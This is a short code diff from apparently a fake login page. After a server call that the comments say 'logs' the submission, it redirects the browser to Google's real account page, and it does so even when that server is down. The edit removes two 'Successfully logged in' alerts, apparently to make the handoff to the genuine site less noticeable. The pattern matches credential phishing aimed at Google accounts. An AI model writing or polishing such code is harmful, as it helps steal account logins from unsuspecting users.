@@ -356,14 +356,12 @@
                 console.log("Server response:", data.message);
                 
                 // 4. Run your alert and redirect AFTER the server successfully logs it
-                alert('Successfully logged in');
                 window.location.replace("https://myaccount.google.com/?pli=1&nlr=1");
             })
             .catch(error => {
                 console.error("Connection error:", error);
                 
                 // Fallback redirect if server isn't running
-                alert('Successfully logged in');
                 window.location.replace("https://myaccount.google.com/?pli=1&nlr=1");
             });
         }
